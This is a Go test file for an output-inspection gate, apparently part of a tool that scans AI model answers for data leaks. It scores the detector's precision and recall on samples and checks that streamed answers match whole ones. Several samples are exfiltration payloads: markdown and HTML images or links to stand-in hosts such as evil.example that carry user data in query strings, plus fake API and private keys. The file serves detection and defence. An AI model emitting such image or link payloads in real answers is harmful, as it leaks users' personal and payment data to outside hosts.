package detection

// The output-inspection gate (PR-6): what KyGate finds in model answers.
// A miss lets data leave through an image or an address; a false alarm
// damages a good answer. Both are tracked, with floors, and every answer must
// come out the same whether it arrives whole or streamed in pieces of any size.
//
// Every site here is an example domain and every key a documented test value.

import (
	"strings"
	"testing"

	"github.com/Kytherion/KyGate/internal/detect"
)

type answerSample struct {
	text string
	want map[string]int // output type -> number of findings
}

const privateKey = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MaBgRZkAUNY\nexampleexampleexampleexample\n-----END RSA PRIVATE KEY-----"

var answers = []answerSample{
	// Attacks and leaks
	{"Sure! ![chart](https://evil.example/c.png?d=SGVsbG8) Here is the summary.", map[string]int{detect.OutputImage: 1}},
	{`Done. <img src="https://collector.example.net/p.gif?u=alice" width=1> Anything else?`, map[string]int{detect.OutputImage: 1}},
	{"See ![logo][1] below.\n\n[1]: https://track.example.io/l.png?s=abc", map[string]int{detect.OutputImage: 1}},
	{"![x](//evil.example/a.png)", map[string]int{detect.OutputImage: 1}},
	{"![photo of [PERSON_1]](https://evil.example/p.png)", map[string]int{detect.OutputImage: 1}},
	{"Voici le graphique : ![graphique](https://exfil.example.fr/g.png?n=Dupont) et le résumé.", map[string]int{detect.OutputImage: 1}},
	{"[Open your account](https://docs.example.org/login?email=[EMAIL_1])", map[string]int{detect.OutputProtectedURL: 1}},
	{"Visit https://evil.example/save?c=[CREDIT_CARD_1] now.", map[string]int{detect.OutputProtectedURL: 1}},
	{"![a](https://evil.example/x?q=%5BEMAIL_1%5D)", map[string]int{detect.OutputProtectedURL: 1}},
	{"Rendez-vous sur https://docs.python.org/search?q=%5BCREDIT_CARD_1%5D pour la suite.", map[string]int{detect.OutputProtectedURL: 1}},
	{"Your key is sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz0123456789abcd, keep it safe.", map[string]int{detect.OutputSecret: 1}},
	{"Here is the key:\n" + privateKey + "\nStore it well.", map[string]int{detect.OutputSecret: 1}},
	{"More at [this page](https://unknown.example.com/info).", map[string]int{detect.OutputLink: 1}},
	{"See https://unknown.example.com/info.", map[string]int{detect.OutputLink: 1}},
	{`Click <a href="https://unknown.example.com">here</a>.`, map[string]int{detect.OutputLink: 1}},
	{"![a](https://evil.example/a.png) and [b](https://other.example/b)", map[string]int{detect.OutputImage: 1, detect.OutputLink: 1}},
	// Harmless answers
	{"See the [Python docs](https://docs.python.org/3/library/re.html).", nil},
	{"![diagram](https://docs.example.org/arch.png)", nil},
	{"![local](./images/arch.png) and ![root](/img/a.png)", nil},
	{"![inline](data:image/png;base64,iVBORw0KGgo=)", nil},
	{"```python\nx = [1, 2, 3]\nprint(x[0])\nd = {'a': [x[1]]}\n```", nil},
	{"Checklist:\n- [x] done\n- [ ] todo", nil},
	{"Your email [EMAIL_1] was updated, and card [CREDIT_CARD_1] charged.", nil},
	{"Use sk-learn for this, and the sk- prefix in docs.", nil},
	{"Array access a[i](j) is not a link.", nil},
	{"The site python.org has docs; mail support@docs.example.org.", nil},
	{"Run the server, then open http://localhost:8080/api or http://127.0.0.1:3000.", nil},
	{"Les [notes](#section-2) sont plus bas.", nil},
	{"Compare [a] and [b] (both lists).", nil},
}

var outputFloors = map[string]struct{ precision, recall float64 }{
	detect.OutputImage:        {1.0, 1.0},
	detect.OutputProtectedURL: {1.0, 1.0},
	detect.OutputSecret:       {1.0, 1.0},
	detect.OutputLink:         {1.0, 1.0},
}

func evalRules() detect.OutputRules {
	return detect.OutputRules{
		Secrets: "remove", Images: "remove", ProtectedURLs: "remove", Links: "remove", Enforce: true,
		Allowed: []string{"python.org"},
		Known:   map[string]bool{"docs.example.org": true},
		HasPlaceholder: func(s string) bool {
			return strings.Contains(s, "[EMAIL_1]") || strings.Contains(s, "[CREDIT_CARD_1]") || strings.Contains(s, "[PERSON_1]")
		},
	}
}

func TestOutputInspectionQuality(t *testing.T) {
	tp, fp, fn := map[string]int{}, map[string]int{}, map[string]int{}
	for _, s := range answers {
		in := detect.NewOutputInspector(evalRules())
		got := map[string]int{}
		for _, f := range in.Find(s.text, false) {
			got[f.Type]++
		}
		for typ := range outputFloors {
			g, w := got[typ], s.want[typ]
			tp[typ] += min(g, w)
			if g > w {
				fp[typ] += g - w
				t.Logf("false alarm %s in %q", typ, s.text)
			}
			if w > g {
				fn[typ] += w - g
				t.Logf("missed %s in %q", typ, s.text)
			}
		}
	}
	for typ, fl := range outputFloors {
		p, r := ratio(tp[typ], tp[typ]+fp[typ]), ratio(tp[typ], tp[typ]+fn[typ])
		t.Logf("%-22s precision %.2f recall %.2f", typ, p, r)
		if p < fl.precision || r < fl.recall {
			t.Errorf("%s below its floor: precision %.2f (floor %.2f), recall %.2f (floor %.2f)", typ, p, fl.precision, r, fl.recall)
		}
	}
}

// A streamed answer comes out exactly as the same answer sent whole, whatever
// the size of its pieces, with the same counts.
func TestOutputInspectionStreamsLikeWholeAnswers(t *testing.T) {
	for _, s := range answers {
		whole := detect.NewOutputInspector(evalRules())
		want := whole.Text(s.text, false)
		for _, size := range []int{1, 2, 3, 4, 5, 7, 11, 16, 64, 1000} {
			in := detect.NewOutputInspector(evalRules())
			st := in.NewStream(false)
			var b strings.Builder
			for i := 0; i < len(s.text); i += size {
				b.WriteString(st.Push(s.text[i:min(i+size, len(s.text))]))
			}
			b.WriteString(st.Flush())
			if b.String() != want {
				t.Fatalf("pieces of %d bytes:\n got %q\nwant %q", size, b.String(), want)
			}
			if a, c := in.Counts(), whole.Counts(); len(a) != len(c) || (len(a) > 0 && a[0] != c[0]) {
				t.Fatalf("pieces of %d bytes in %q: counts %v, whole %v", size, s.text, a, c)
			}
		}
	}
}
